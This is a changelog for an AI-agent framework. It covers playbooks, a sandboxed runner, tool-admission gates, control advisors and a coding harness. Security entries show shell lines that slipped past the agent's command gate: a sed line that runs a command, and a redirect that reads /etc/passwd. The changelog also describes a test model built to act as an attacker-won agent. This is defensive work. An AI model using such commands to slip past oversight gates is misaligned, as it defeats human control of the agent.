# Changelog

All notable changes to Tulip are documented here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/) and — from 1.0
onward — [Semantic Versioning](https://semver.org). See
[`DEPRECATION.md`](DEPRECATION.md) for the deprecation and breaking-change
policy.

## [Unreleased]

### Added

- **Playbooks v2: typed process data.** A v2 playbook declares its data as typed fields,
  the registry's `PlaybookField` (`tulip.playbooks.v2.fields.Field`): `name`, `label`,
  `type` (`text | number | money | date | boolean | choice | email | url | file`),
  `choices`, `required`, `sensitive` (default `true`) and `description`.
  - `inputs` are fields (`PlaybookV2.input_fields`); an old `{name, description,
    required}` input still reads as a sensitive text field, and `PlaybookV2.inputs` keeps
    its `(name, description)` pairs. A step's `outputs: [field]` sits beside the old
    `expected_outputs: [str]` (each a text field); `Step.output_fields()` merges them the
    registry's way, and `Step.data_fields()` adds the answers. `required_from_user[].field`
    types a question's answer. Reading stays tolerant: an unknown type reads as text.
  - `complete_step` checks every typed output and typed answer with
    `validate_value(field, value)` -- a port of the registry's, same sentences -- and
    refuses with `{"ok": false, "invalid": {name: sentence}}`, listing every bad field at
    once. Money is `{amount, currency}` with an ISO 4217 code; a date is `YYYY-MM-DD`; a
    file is `{ref, name, size?, media_type?}`, never bytes. A required typed output must
    be present. Untyped `expected_outputs` accept any value, as before.
  - `PlaybookRuntime.set_inputs(values)` (or `start(inputs=...)`) gives a run its inputs
    and returns what was wrong with them (`validate_inputs`, the registry's run-start
    check). Conditions read them as `inputs.<name>`. Money compares by amount -- with a
    number (`inputs.amount > 10000`) or money in the same currency; ordering two
    currencies is `unknown`. Dates compare chronologically, numbers numerically
    (`when.Money`, `when.Day`). A required input not given, an invalid one or a digest
    is UNAVAILABLE, so a branch reading it is `unknown` and `complete_step` refuses to
    route (`"unavailable_inputs": [...]`); a restored run needs its inputs set again.
  - `PlaybookRuntime.public_outputs(step_id)` and `public_inputs()` return only the valid
    values of `sensitive: false` fields, for the gateway to mirror in clear while it
    digests the rest. No event gains a field.
  - A step's brief tells the model how to write each typed value.

### Fixed

- **A restored v2 playbook run never mistakes a digest for data.** Under the gateway's
  `metadata_only` custody a mirrored `playbook_step` record holds a digest
  (`{"redacted": true, "sha256", "bytes"}`) where a step's `outputs` were. Before,
  `PlaybookRuntime.restore()` put that digest back as if it were the outputs, and a later
  branch reading `outputs.<step>.<name>` routed on it: every such path resolved `null`, so
  the run took (or waived) branches on a guess.
  - A closed step whose record holds its outputs as a digest -- or not at all, as a
    `not_executed` one never does -- is restored with its outputs UNAVAILABLE; so is a
    single output value held as a digest. `PlaybookRuntime.unavailable_outputs()` and
    `RestoreResult.unavailable` name those steps.
  - The `when` language answers a condition that reads a withheld value `unknown`
    (`when_verdict()`; `evaluate_when()` still answers yes/no, and unknown is not yes).
    `StepGraph.branch_verdicts()` gives each branch's `true`/`false`/`unknown`.
  - `complete_step` on a step with an `unknown` branch refuses to route and changes
    nothing: `{"ok": false, "routing": "unknown", "branches_unknown": [...],
    "unavailable": [...]}`, which the gateway can turn into a hold. An explicit
    `select_branches` still routes.
  - `restore(events, outputs={step_id: {...}})` takes the real values from a caller that
    holds them (the gateway's data-plane checkpoint). They are checked against the record:
    their digest must be the record's `sha256` (or equal its plain outputs), else
    `RestoreError`.
  - A record whose `verified` is a digest restores the step unverified (a digest is not a
    yes). Under `metadata_only` the steps active at the move therefore emit
    `verified: false` afterwards, until the gateway passes `verified` through as shape.
- **A step that declares questions closes only with their answers.** A step with
  `required_from_user` now closes only when each declared name is in its outputs and not
  blank; calling `ask_user` once no longer stands in for the answers. The refusal names
  what is missing.

### Added

- **Declared questions are told apart from the agent's own**, for a per-run `ask_user`
  budget: `PlaybookRuntime.declared_question(step_id, name)` and
  `PlaybookRuntime.ask_is_declared()` -- asked before the call is admitted, true for the
  first `n` asks of an active step that declares `n` questions, false after that. A
  declared ask is attributed to the step that declares it.

## [2.25.2] - 2026-10-09

### Fixed

- **A box run survives OpenShell cutting its connections.** OpenShell cuts a box's
  connections whenever the box's policy generation moves on, and the first settings poll
  after start always moves it (`provider_env_changed`, about 10 s in). A model turn still
  streaming then broke (`L7 tunnel closed before inspection because policy changed: policy
  generation is stale`), and the OpenAI client never retries a stream that broke after it
  began: the run ended `APIConnectionError: Connection error.` (live F29/F30 on dev, about
  one box run in three that lasted past 10 s).
  - `OpenAIModel(stream_reconnects=n)` (default 0, unchanged): each turn is read whole and
    asked again when its connection drops part way, up to `n` times; partial output is never
    yielded, so no turn is seen twice. A refusal (any HTTP status, e.g. a box guard's
    `token_budget_exhausted`) is never asked again. The box runner turns it on (3).
  - The runner's gateway client sends again a call the box's network cut, when that is
    safe: any call that never connected, and reads, checkpoints and event batches (deduped
    by `seq_from`). An admission, a gateway tool or a result is never sent twice.

## [2.25.1] - 2026-10-09

### Fixed

- **A call held for its step's approver runs once approved.** `PlaybookRuntime.pause()`
  now releases the admission of a call that was admitted but had not finished -- the call
  held for the person. Before, the redelivered call counted a second time: a step with
  `max_tool_calls: 1` refused its own approved call (`too_many_calls`) and then could not
  close (`insufficient_effort`), so the approved action never ran (live F38/F39 on dev).
  A call that finished before the pause still counts.

## [2.25.0] - 2026-10-09

### Added

- **A playbook v2 runtime can be restored from its own step events.**
  `PlaybookRuntime.restore(events)` takes a run's `playbook_step` payloads, as the engine
  emitted them, in order, and puts a fresh runtime where they left it, emitting nothing:
  each step's last status, why a waived step was waived, the calls each step made (and
  whether it deviated), a done step's outputs (a later branch's `when` reads them), and the
  targets each finished router took (its record's `enabled_steps`, else the targets that
  were not waived). It returns a `RestoreResult` (`records`, `statuses`, `active`), and the
  runtime then reports `restored` and counts as started. It is all or nothing: a record
  that is not a mapping, names another playbook or an unknown step, or carries an unknown
  status, no step records at all, or a step with no record raises `RestoreError` (with
  `reason`) and changes nothing. `PlaybookRuntime.hold_unstarted()` is for a caller that
  then fails closed: it counts as started without recording a step tree. A run that moves
  pods resumes in the step it was in, so a step's approval still holds the calls made in it;
  the gateway did this by writing the runtime's private fields and now has an API for it.
  `RestoreError`, `RestoreResult`, `STATUSES` and `RESTORED_CALL` are exported from
  `tulip.playbooks.v2`. Playbook events are unchanged.

## [2.24.1] - 2026-10-09

### Fixed

- **A resumed box runner numbers its events on.** A runner resumed after a hold is a new
  process, and it numbered its events from 0 again; the gateway drops a batch whose numbers
  it has seen, so the first events after a resume (the approved call's start, its result and
  its `harness.exec` record) never reached the run's record. The runner now leaves its next
  event number in `/sandbox/.tulip/events.seq` and the next runner of the run starts from it.
- **The box runner keeps no connection alive.** NVIDIA OpenShell closes a kept-alive tunnel
  once the box's policy generation moves on, and a command resolving a new host is enough
  (`L7 tunnel closed before inspection because policy changed: policy generation is stale`).
  A turn whose tool calls resolved two hosts left the runner's pooled model connection stale,
  and its next model call failed with `APIConnectionError: Connection error.` The runner's
  model client and gateway client now open a connection per request
  (`OpenAIModel(keepalive=False)`, a new option, on by default elsewhere).

## [2.24.0] - 2026-10-09

### Added

- **A playbook v2 step may name who approves it.** A step takes an optional
  `approval: {by, ask, show}`: `by` is an approvals grant label, `ask` the plain text
  the approver reads, `show` the call's arguments to put in front of them first. The
  engine parses it into `StepApproval` (exported from `tulip.playbooks.v2`) on
  `Step.approval`, tolerantly: without a non-empty string `by` it reads as no approval
  (the registry validates the shape strictly at publish). The gateway compiles it into a
  hold on that step's tool calls only. Playbook events are unchanged.
- **`PlaybookRuntime.owner_of(tool)` and `PlaybookRuntime.active_steps()`**: the active
  step a call would be attributed to, and the steps active now -- so a caller can find
  the approval that governs a call before it runs.

## [2.23.1] - 2026-10-08

### Fixed

- **A box runner can reach its gateway inside NVIDIA OpenShell.** The runner made
  itself non-dumpable at start (`prctl(PR_SET_DUMPABLE, 0)`) to keep its token and
  placeholders from its commands. OpenShell identifies the process behind every DNS
  lookup and connection through `/proc/<pid>` (`require_binary_identity`) and cannot
  identify a non-dumpable one, so it refused the runner's lookups: every box run ended
  at once with `ConnectError` (`Temporary failure in name resolution`) on
  `GET /internal/v1/runner/next`, exit code 1, nothing logged.
  - The runner now stays dumpable and, once its runtime is built and before any
    command can run, wipes the token and every placeholder out of its initial
    environment block (what `/proc/<pid>/environ` shows) and out of `os.environ`
    (`tulip.runner.harden.protect`, `wipe_initial_environ`). Commands still never
    inherit them; reading the runner's memory needs ptrace, which Yama refuses a child.
  - `TULIP_RUNNER_HARDEN=non-dumpable` keeps the old behaviour for a sandbox that does
    not identify processes that way.
- **The runner keeps a log in the workspace** (`/sandbox/.tulip/runner.log`), so its
  gateway can show why a box ended without a report. It holds no values.

### Changed

- **`tulip-runner.pyz` is no longer attached to GitHub releases.** The release
  still builds it (and checks that it starts) for the private
  `ghcr.io/tuliplabs-ai/tulip-runner` image. Anyone else builds it from the
  published wheel with `scripts/build_runner_pyz.sh`; a Tulip gateway builds its
  own at image build time.

## [2.23.0] - 2026-10-08

### Added

- **The box runner itself: `python -m tulip.runner` (also `tulip-runner`).**
  Builds a run's agent from its `RunManifest` and nothing else, runs it inside
  the box, and parks or reports when it stops. See `docs/runner.md`.
  - `build_runtime`: an OpenAI-compatible model on `model.base_url`, keyed by
    the OpenShell placeholder (never a key) and sending
    `Accept-Encoding: identity` so the box guard can meter usage
    (`OpenAIConfig.default_headers` is new). Tools by `runs`: `box` → the
    harness tools over `/sandbox`, plus `ask_user` (pauses the run) and `task`
    (a subagent in the same box, as a child run the gateway mints); `gateway`
    → `RemoteTool`; `mcp:<id>` → `tools/call` on that mount; `api:<id>` → one
    operation of an API connector. A box tool the runner cannot build refuses
    the run. Every call except the gateway's own goes through `RemoteGate`;
    its decision token reaches only the MCP and API tools, which send it as
    `x-tulip-decision`. A call still held after `budgets.park_ttl_s` (default
    600 s) pauses the run, checkpointed with the gateway. A v2 playbook is shown
    in `tulip.playbooks.v2`'s own prose; plan mode adds its rules to the prompt.
  - `RunManifest` learns API connectors (`api`, `ApiConnector`, `ToolEntry.operation`,
    `runs: api:<id>`), the run's `input`, and `budgets.park_ttl_s`.
    `api_request` maps a call's arguments to exactly one request (path
    parameters, query, canonical JSON body), so the gateway can bind a decision
    token to the request the box guard will see.
  - `McpClient`: a minimal streamable-HTTP MCP client (`initialize` once, then
    `tools/call` with the token).
  - Two routes for the gateway to serve: `POST /internal/v1/runs/{id}/result`
    (`report_result`: done, parked — with what it waits for —, refused or
    error, the final message and the runner's own usage count) and
    `POST /internal/v1/runs/{id}/children` (`mint_child`: a subagent's run and
    its workload token).
  - `RemoteGate` gains `server_admitted` (tools the gateway admits on its own
    route), `token_tools` (which bodies get the token), `defer_unsettled`,
    `prime` and `pending_hold` (park and resume a held call).
  - Commands the harness runs do not inherit the runner's workload token or any
    credential placeholder (`LocalBackend(base_env=...)` is new), and the
    runner marks itself non-dumpable so a command cannot read them back from
    `/proc`.
  - Shipped as `tulip-runner.pyz` on each GitHub release and as the image
    `ghcr.io/tuliplabs-ai/tulip-runner` (`runner.Dockerfile`,
    `scripts/build_runner_pyz.sh`).

## [2.22.0] - 2026-10-08

### Added

- **`tulip.runner`: the protocol a box runner speaks with the Tulip gateway.**
  A box runner is one agent's loop running inside an NVIDIA OpenShell sandbox,
  started by a gateway for one run; the gateway stays the control plane. This
  release adds the runner's side of that contract, with no agent building yet:
  - `RunManifest` (v1): what the runner runs — the pinned definition, the tool
    surface and where each tool runs (`box`, `gateway` or `mcp:<id>`), MCP
    mounts, harness, an optional v2 playbook, budgets and the model route. Strict
    (unknown fields refused) and digested as `sha256:` over canonical JSON. The
    model key is named only by the env var holding its OpenShell placeholder.
  - `RemoteGate`: the admission hook, first of all hooks. Every tool call is
    sent to `POST /v1/admit` as `{run_id, call_id, tool, arguments}` — never
    labels — and decided by the gateway. Allowed calls keep a one-shot decision
    token (optionally passed to the tool in `secret_arguments`); held calls wait
    for a person up to `hold_wait_s`, are asked again with the `approval_id`, or
    are recorded in `RemoteGate.held` for the runner to park on; denials are
    cancelled with the gateway's reason. An unreachable or refusing gateway
    cancels the call: it fails closed.
  - `GatewayEvents`: progress events (`token`, `think`, `tool_start`,
    `tool_complete`, `tool.sandbox.output`, `harness.exec`, `playbook_step`,
    `playbook_progress` — nothing the gateway alone writes) to
    `POST /internal/v1/runs/{id}/events` in numbered batches, spooled to
    `/sandbox/.tulip/events.jsonl` while the gateway is unreachable and replayed
    in order.
  - `GatewayCheckpointer`: a `BaseCheckpointer` whose checkpoints the gateway
    keeps (`PUT`/`GET /internal/v1/runs/{id}/checkpoint`,
    `GET …/checkpoints`).
  - `RemoteTool`: a `runs: gateway` tool, performed by
    `POST /internal/v1/runs/{id}/tools/{name}`.
  - `next_op` / `fetch_manifest`: the start-up handshake
    (`GET /internal/v1/runner/next`, `GET /internal/v1/runner/manifest`); a
    manifest for another run is refused.
  - `RunnerConfig.from_env` reads `TULIP_ADMIT_URL`, `TULIP_ADMIT_TOKEN` and
    `TULIP_RUN_ID`, the values a gateway sets in every box. The workload token
    is sent as a bearer token and never appears in a repr or an error.
- **`tulip.playbooks.v2`: the v2 playbook engine, moved out of the gateway.** The
  step graph a ``playbook.v2`` definition describes (groups, ``after``,
  ``parallel_group`` and ``joins``, branches routed by the ``when`` language, one
  decision policy outcome), the three control tools that drive it
  (``complete_step``, ``select_branches``, ``submit_decision``), its allowlist and
  effort-floor checks, waivers, deviations and the prose the model is shown. It was
  ``tulip_gateway.playbook_v2`` and ``tulip_gateway.when``; it now lives here so the
  same code can run next to the agent loop wherever that loop is (the gateway, or a
  runner inside a sandbox box), with the gateway's copy the authoritative one.
  Behaviour is unchanged: ``tests/unit/playbooks_v2/test_golden.py`` replays seven
  scripted runs (the registry's refund-dispute example and the live suite's F19
  playbook, recording and blocking, paused and resumed, plus the ``when`` corpus)
  and wants the exact events, audit fields, answers and prose the gateway's engine
  produced at gateway ``80aed44``. Pure: no I/O, no environment. Two seams differ
  from the gateway's module:
  - ``PlaybookRuntime(record=...)`` replaces ``audit=``: it is handed
    ``(event, fields)`` -- ``playbook_step`` or ``playbook_decision`` and exactly
    the fields of the gateway's ``PlaybookStepAudit`` / ``PlaybookDecisionAudit``
    -- and whoever owns the chain makes the record.
  - ``enforcement_mode(playbook, deployment="record")`` takes the deployment's
    default as an argument instead of reading ``TULIP_GATEWAY_PLAYBOOK_ENFORCEMENT``.

## [2.21.3] - 2026-10-07

### Security

- **`sed` that edits in place, writes a file or runs a command is no longer a
  read.** `sed -n` is on the read-only list because it prints, but `sed -n -i`,
  `--in-place`, `-i.bak`, the `w` command and GNU's `e` command
  (`sed -n '1e touch pwned' f`) were classified `workspace.read`, so an edit or
  a shell command cleared the gate as a read. Found by a Tulip harness agent
  asked to review `tulip.harness.labels`. A script holding `w`, `W` or `e`
  anywhere, or read from a file (`-f`), is now an exec.

## [2.21.2] - 2026-10-07

### Fixed

- **A read after an edit shows the edit.** `read`, `grep`, `glob`, `ls` and
  `todo_read` were declared idempotent, and the agent loop answers a repeated
  idempotent call from the run's earlier result without running it, so a read
  after a write returned the file as it was (seen live in a subagent). No
  harness tool is idempotent now.
- **A redirect from a file is not a read.** 2.21.1 let any redirection that
  writes no file pass as a read, which included `cat /dev/null < /etc/passwd`:
  a path no argument names, out of the workspace checks' sight. Only
  redirections that join or discard output (`2>&1`, `>&2`, `>/dev/null`) pass.

## [2.21.1] - 2026-10-06

### Fixed

- **A command that only reads is no longer held as an exec because of `2>&1`.**
  `tulip.harness.labels` counted any redirection as a write, so `cat x 2>&1`,
  `grep y f >&2` and `ls 2>/dev/null` were classified `workspace.exec` and held
  for a person under a blast-radius maximum of 1 (seen live: a subagent's
  `ls -la notes.txt 2>&1; cat notes.txt 2>&1`). Only a redirection that writes a
  file counts now (`SimpleCommand.writes_files`), and a list (`;`, `&&`, `||`)
  of read-only commands reads; `> file`, `>> file`, `2>file`, `tee` and
  backgrounding (`&`) still do not.

## [2.21.0] - 2026-10-06

### Added

- **`tulip.testing.CompromisedModel`: a model an attacker has already won,
  for your own rogue suite.** It calls the attack on every model call that
  offers tools and never refuses, so a test checks what has to hold when the
  model does not: the gate, the offered tools, the audit trail. Name a tool
  and its arguments, or pass `(messages, tools) -> (name, arguments) |
  ModelResponse | None` to choose each turn's call. `rounds=` caps the calls
  per run (counted from the conversation, so one model serves concurrent
  runs), `after=` is what it says once it stops, and by default it also calls
  tools the agent never offered, which the agent has to refuse
  (`offered_only=True` turns that off). Every call is recorded on
  `attempts`. It is the offline mode of `python -m tulip.rogue`, made
  reusable against your own agent.
- **`tulip.testing.MockModel`**, another name for `FunctionModel`, because
  that is the name people coming from other SDKs look for. A fixed list of
  turns is still a `ScriptedModel`.
- **`gate_tool(advisor=)`, and a verdict worked out for each call.** A
  trained control model (any `ControlAdvisor`) is now passed through
  `gate_tool`, `admit` and `admit_sync` to `approve(advisor=)` on every call,
  including the re-admission of an approved hold; as everywhere, it can only
  make a decision stricter, and one that fails or has no opinion changes
  nothing. When an advisor is given, the `action-admission` trail entry also
  carries `policy_outcome` and `model_outcome`. `gate_tool`'s `verdict=` and
  `finding=` also take `(tool_name, arguments) -> value`, sync or async,
  asked for each call instead of fixed when the tool is wrapped (and asked
  again about an approver's edited arguments), so one gated tool on a shared
  agent can be verified call by call. A callable that returns `None` is no
  verification; one that raises refuses the call with a `deny`, recorded on the
  trail, so a failed verification never passes for one that was not required.
- **`tulip.decision`: typed decisions with probabilities.** Ask a model a
  `Choice(name, question, options)`, a `YesNo(name, question)` or a
  `Score(name, question, levels)` about one input and get back an `Answer` per
  field: a probability for every listed answer, the argmax, its margin, and
  `coverage`, the share of the model's probability that went to the listed
  answers at all. The default provider, `LogprobDecider`, needs only an
  OpenAI-compatible server that returns logprobs (vLLM, llama.cpp, LM Studio):
  one `max_tokens=1` request per field with `top_logprobs`, fields of one
  input sent concurrently, and `DecisionError` instead of a guess when no
  listed answer is among the top tokens. The prompt (`SYSTEM_PROMPT`,
  `render()`) is a fixed, tested contract, so a head fine-tuned on it is served
  with no glue. `DecisionAdvisor` plugs an admit head into
  `approve(advisor=)`, by argmax or by a certified `hold_at` threshold on
  `1 - P(allow)`, and like every advisor it can only make a decision stricter.
  `verification_from_decision()` turns yes/no safety heads into the
  `VerificationResult` that `ControlPolicy.require_verification_score` weighs:
  a head at its threshold denies. `TenantDecisionRouter` serves each tenant
  from its own head only, refuses an unknown tenant, and records every
  decision (labels and probabilities, never the input unless
  `record_text=True`) on that tenant's audit chain; `per_tenant_trails()` is
  its zero-infra audit side. See [`docs/decision.md`](docs/decision.md).
- **`EventBusHook()` without a `run_id` follows the run.** Each event is
  tagged when it fires: with the id of the active `run_context` when the
  caller entered one, else with the run's own `AgentState.run_id`. One hook on
  one shared Agent now serves every run, concurrent ones included, instead of
  a host subclassing the hook to override its private `_run_id`. A given
  `run_id` still tags every event, and an empty one is still refused.
- **`PlaybookEnforcerHook(select=...)` enables a playbook per run.**
  `select(run) -> Playbook | None` is asked once per run, on its first tool
  call, so a host turns a playbook on for one turn (from `run.metadata`, say)
  and leaves the others alone. A selector that raises fails closed: every tool
  call of that run is cancelled with a message saying the playbook could not
  be chosen. `enforcer_for(run_id)` inspects one run's plan; `scope="thread"`
  keeps one plan per conversation and `scope="agent"` one for everything.
- **`SkillsPlugin(router=...)`: skills a host routes per run, on one Agent.**
  `router(text, run)` gets the run's latest user message and its `RunInfo`
  (`run.metadata` is what `agent.run(..., metadata=)` passed), sync or async,
  and returns the skill names active for that run. It is asked once per run,
  before the run's first model call, and its answer replaces `active=` for
  that run (`None` keeps `active`, an empty list means none). An unknown name
  is logged and ignored, and a router that raises leaves the run on `active`,
  so a routing mistake never costs a live turn. With
  `enforce_allowed_tools=True` the routed skills' `allowed-tools` bind that
  run's calls. The router cannot change which tools the model is offered
  (`BeforeModelCallEvent.tools` is read-only); a disallowed call is cancelled
  before it runs.
- **The wrapper text around skills is the host's.** `active_preamble=` and
  `catalog_preamble=` replace the sentences before the active instructions
  and the catalog, `render_skill=(skill) -> str` renders each active skill,
  and `skill_footer=False` leaves the `Allowed tools` / `Compatibility` /
  location footer out of the default rendering.
- **`BaseStore.search_many(namespaces, query, limit)`: one call for several
  namespaces.** It returns one list per namespace, as `search` would. The
  default loops `search`, so every store has it. `PgMemory` answers it in one
  transaction and one `SELECT` (`unnest ... WITH ORDINALITY` with a `LATERAL`
  search per namespace), encodes the query once, and refuses a call whose
  namespaces belong to more than one tenant (`namespace[0]`).
- **`MemoryScope`: recall shared memories with a run's own.** A
  `namespace_resolver` may return `MemoryScope(namespace=..., recall=(...))`
  instead of a prefix. Session start then recalls the run's namespace and the
  read-only `recall` namespaces (a team's, a household's) in one call and one
  memory block, and extraction still writes only to `namespace`. A recall
  namespace whose first element differs from `namespace[0]` belongs to
  another tenant: it is dropped with a warning and never read.
  `LLMMemoryManager.retrieve` / `retrieve_relevant` also take `namespaces=`,
  and `scoped(prefix, recall=...)` sets the same scope by hand.
- **`PgMemory(encoding_cache=1024)`.** Encodings are cached per store, keyed
  by `(tenant, text)`, so an entry is never reused for another tenant. One
  recall no longer runs the pure-Python HRR encoding once per memory type for
  the same words. `0` turns the cache off.
- **`PgCheckpointer`: agent threads in Postgres, one tenant's apart from
  another's.** Every row carries its tenant and Row-Level Security admits only
  the tenant pinned for the transaction (`tulip.tenant`, the setting `PgMemory`
  uses), on read and write, `FORCE`d for the owner too; every query also
  filters on it. The tenant comes from a `tenant_scope()` block, a
  `tenant_of(thread_id)` callable, or `tenant=`; a `tenant_of` that cannot place
  a thread fails the call. A save is one statement (the upsert, and with
  `keep_checkpoints=N` the thread's pruning) where the generic
  `postgresql_checkpointer()` adapter makes four round trips. The schema is
  probed before any DDL, so a role with no `CREATE` works against a table a
  migration made (`PgCheckpointer.ddl()` gives the statements,
  `create_schema=False` never runs any). Per tenant: `vacuum()`,
  `purge_messages()` and `forget_tenant()`. See
  [`docs/pg-checkpointer.md`](docs/pg-checkpointer.md).
- **Per-message retention, so a thread used every day stops growing.**
  `tulip.memory.retention` stamps each message the first time it is
  checkpointed (`Message.metadata["tulip_at"]`, never sent to a provider) and
  drops whole exchanges older than a cut-off, keeping system messages and
  anything unstamped. `PgCheckpointer(message_retention=...)` trims at every
  save and `purge_messages(older_than)` rewrites idle threads in place;
  `RetainedCheckpointer(inner, max_age=...)` gives any checkpointer, the local
  `MemoryCheckpointer` and `FileCheckpointer` included, the same trim on save.
- **Durable `StateGraph` runs on DBOS** (`tulip.durable.dbos`). A graph runs
  the way an agent already does: in segments, each at most once, with the
  workflow waiting durably at every `interrupt()` for the value to resume
  with — a person's decision, a job's result from another machine — across
  process restarts. `register_graphs`, `start_graph_run`, `pending_interrupt`
  (the pausing node and its payload), `resume_graph`, the `TulipGraphRun`
  workflow and the `tulip_run_graph_segment` step; `GraphSegmentOutcome` says
  where a segment left the run (`done`, `paused`, `failed`). Each segment runs
  with its own copy of the graph's config, so one registered graph serves any
  number of runs at once. The engine-independent segment is
  `tulip.durable.segments.run_graph`. Local default: DBOS on SQLite and a file
  checkpointer; in production both in Postgres. DBOS's and the checkpointer's
  tables carry no tenant column, so a multi-tenant caller keeps tenant data
  under its own row-level security, puts only ids in graph state, and keys
  thread and workflow ids per tenant.

### Changed

- **A playbook's progress belongs to the run, not to the Agent.**
  `PlaybookEnforcerHook` (and so `Agent(playbook=...)`) keeps one enforcer per
  run id, in a most-recently-used map bounded by `max_runs` (1024). Two users
  on one Agent no longer advance, or violate, each other's plan, and a second
  run starts the playbook at step one rather than where the last run left it.
  A run paused for approval and resumed in the same process keeps its run id,
  and with it its place in the plan. `hook.enforcer` is the most recent run's,
  which is what it showed before for runs one at a time; pass
  `scope="agent"` for the old single plan. To keep one plan across runs,
  install the hook yourself instead of passing `playbook=`:

  ```python
  from tulip.playbooks.hook import PlaybookEnforcerHook

  # 2.20: Agent(..., playbook=pb)
  agent = Agent(..., hooks=[PlaybookEnforcerHook(pb, scope="agent")])
  ```

- **A recall costs two store calls.** `LLMMemoryManager.retrieve` reads every
  memory type of every recalled namespace with one `search_many` for the
  ranking and one for the recency top-up. On `PgMemory` that is 2
  transactions and 4 statements instead of 8 and 16. Results are the same:
  matches are interleaved rank by rank and topped up by recency. A store whose
  `search_many` fails falls back to the per-namespace path. Pruning to
  `max_memories` reads a type with one `search` instead of `list_keys` plus a
  `get` per key.
- **`tulip-agents[pgvector]` installs numpy.** `PgMemory`'s HRR encoding needs
  numpy. Without it, rows were stored with no vector and recall quietly became
  a substring match. Now `PgMemory` raises a `RuntimeWarning` when it is built
  without numpy and without an embedder, and logs a warning the first time a
  search degrades to `ILIKE`. Its missing-driver error now names
  `tulip-agents[pgvector]`.

### Fixed

- **A skill activated in one run no longer widens another run's tools.**
  `SkillsPlugin` kept one activation list for every run it served, so a skill
  the model activated through the `skills` tool stayed in
  `allowed_tools()` for every later and concurrent run of a shared Agent.
  Routed and model-activated skills are now per run and dropped when the run
  ends; `allowed_tools(run_id)` reads one run's, and `activated_skills` still
  reports the most recent run's.
- **`PostgreSQLBackend` no longer needs `CREATE` when its table exists.** It ran
  `CREATE SCHEMA IF NOT EXISTS` on first use, which Postgres refuses without
  `CREATE` on the database even when the schema is there; it now probes for the
  table first and runs no DDL when it finds it.

## [2.20.0] - 2026-10-06

### Added

- **`tulip.harness`: a coding harness written once, run on any workspace.**
  The tools every coding agent converges on — `read`, `write`, `edit`,
  `multi_edit`, `apply_patch`, `glob`, `grep`, `ls`, `bash` with
  `bash_output` / `write_stdin` / `kill_shell` for background commands,
  `notebook_edit`, `todo_write` / `todo_read` — written against one
  `WorkspaceBackend` protocol (an extension of the deepagent
  `BackendProtocol` with bytes, stat, windowed reads, `exec` and background
  jobs). Four backends: `LocalBackend` (the host, files confined to a root,
  commands in their own process groups, labelled `UNISOLATED: host shell`),
  `MemoryBackend` (files only, for tests), `SessionBackend` (any sandbox that
  can run a command and move a file, through a three-method `SessionLike`
  adapter; background commands are process groups the sandbox owns) and
  `OpenShellBackend` (an NVIDIA OpenShell sandbox, files over `exec`, the
  gateway's `execution_timeout`; `pip install "tulip-agents[openshell]"`).
  The behaviour is tulip-code's: read-before-edit with a staleness check on
  the content hash, CRLF kept, near-miss edits matched and reported, head and
  tail output with the full text spillable to a `ToolResultStore`, a
  command that outlives its timeout kept under a handle.
- **The single-gate rule.** Tool bodies never call a gate.
  `build_harness(backend, wrap=...)` applies one `wrap(tool, action_spec)` to
  every tool — `tulip.control.gate_tool` locally, the gateway's own gate
  remotely — and `tulip.harness.labels` derives each call's `Action`:
  `workspace.read` / `workspace.write` / `workspace.exec` / `network`, with
  shell lines classified by `classify_command` into tags such as
  `exec:destructive`, `exec:vcs-push`, `exec:network`, `exec:check` and
  `exec:unparsed` (an unparseable line fails closed). `wrap=None` builds
  ungated tools and logs a warning when they include a host shell.
  `Harness.preview(name, args)` shows a file change's diff without writing.
- **`ExecRecord` evidence for every command**: command and output by
  SHA-256, exit status, duration, timeout, truncation and the backend label,
  emitted as `harness.exec` on the event bus and to an `on_exec` sink.

## [2.19.0] - 2026-10-06

### Added

- **`ModelRetryConfig(retry_unclassified=True)`** also retries failures the
  classifier cannot place, with the same backoff. Off by default, since such an
  exception is as likely a bug in a hook as a provider failure.
- **Malformed tool-call arguments go back to the model.** A tool call whose
  arguments are not JSON no longer runs with `{}`: the tool is skipped and the
  model gets an error that asks it to resend the call as a valid JSON object.
  The raw text is kept on `ToolCall.malformed_arguments`. Covers the OpenAI
  chat-completions adapter, streaming and not.

- **`tulip.models.profiles.profile_for(model)`** returns a frozen
  `ModelProfile`: context window, output cap, native and parallel tool
  calling, how reasoning is requested (`adaptive`, `budget_tokens`,
  `reasoning_effort`, `thinking_budget`, `enable_thinking`), prompt caching,
  vision, the edit format the model handles best (`apply_patch` for the GPT
  family, `str_replace` otherwise), a prompt variant and the tool-call markup
  the model leaks as text (`leaked_tool_call_formats`). Families: claude,
  gpt, gemini, qwen, deepseek, kimi, glm, llama, mistral and a conservative
  default.
  Window, output cap and caching come from `tulip.models.metadata`; overrides
  by id or glob come from `overrides=` or a JSON file named by
  `TULIP_MODEL_PROFILES`, and an unknown field in one is an error. The
  profile describes a model; nothing changes behaviour because of it except
  the image routing below and the leaked tool-call recovery under Fixed.
- **Metadata for current models**: `gpt-5.5`, `gpt-5.5-mini`, `gpt-5.5-nano`,
  and Claude Fable 5.1 / 5, Opus 5.5 / 5 / 4.8 / 4.7 / 4.6, Sonnet 5.5 / 5 /
  4.6 and Haiku 4.5, with list prices — so `max_cost_usd` works on them
  instead of refusing to start. `metadata_for` also resolves a dated snapshot
  (`-20250929`, `-2025-09-29`, `@20251101`) or a `-latest` alias to its base
  record; no other suffix is stripped, so `gpt-5.6` never borrows `gpt-5`'s
  price.
- **`TerminateEvent.cost_usd`** (USD, `None` when the model is unpriced),
  **cache tokens in `TerminateEvent.usage`** (`cache_read_input_tokens`,
  `cache_creation_input_tokens`, present only when non-zero), and
  **`TerminateEvent.error`**, the failure's text when `reason == "error"`. A
  resumed or continued segment that fails now emits that error termination
  too; it used to raise without one.
- **Images in user messages.** A user turn carrying `encode_image` segments
  is sent as text and image parts on Anthropic, OpenAI chat-completions and
  the Responses API; Bedrock sends a placeholder instead of the base64 text.
  On chat-completions a tool result's images (which a tool message cannot
  hold) now follow the tool batch in a user message when the model's profile
  says it can see; a text-only model keeps getting the placeholder.
- **`tulip.tools.structured_output.StructuredOutputTool(schema)`** holds a
  turn to a final answer that matches a JSON Schema document, for callers
  that have a schema rather than a Pydantic model and drive `run()` (a CLI's
  `--json-schema`, an API taking a schema per request). The model delivers
  the answer as the arguments of a tool whose parameters are the schema. A
  call that does not validate comes back as a tool error listing every
  offending path, and a turn that tries to end without a valid call is sent
  back by a `final_answer_verifier` (`agent_options()`; `max_reminders`
  replans). `value_from(executions)` reads the answer back, and
